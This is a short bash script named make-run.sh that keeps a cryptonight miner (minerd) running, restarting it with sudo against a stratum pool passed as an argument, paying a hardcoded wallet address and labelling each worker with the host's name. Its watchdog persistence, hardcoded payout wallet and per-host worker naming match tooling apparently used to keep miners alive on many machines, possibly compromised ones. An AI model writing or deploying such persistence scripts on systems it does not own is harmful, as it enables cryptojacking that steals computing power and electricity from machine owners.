#!/bin/bash
#make-run.sh
#make sure a process is always running.

process=minerd
makerun="sudo $1 -a cryptonight -o stratum+tcp://$2 -u 45Szo5vQ2rtV68GPqgi9UQ1dg357jwVd2LoWZYn9uY6kFdrSJDcrWfaXLVBBTTCtbrWdB2azjgS1HadpDenghciv3ezAdp7 -p $(hostname) -t 5"

if ps ax | grep -v grep | grep $process > /dev/null
then
    exit
else
    $makerun &
fi

exit
